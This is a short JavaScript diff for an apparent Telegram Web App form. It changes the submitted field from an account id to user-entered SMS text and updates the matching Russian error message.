@@ -469,13 +469,13 @@
           let t = document.getElementById("text").value;
           if(t) {            
             let data = {
-              id: account_id,
+              sms: t,
               i: '10'
             }
             tg.sendData(JSON.stringify(data));
             tg.close();
           } else {
-            document.getElementById('error7').innerText = 'Ошибка в id';
+            document.getElementById('error7').innerText = 'Ошибка в смс';
             document.getElementById("main").style.display = 'none';
             document.getElementById("seven").style.display = 'block';
           }           
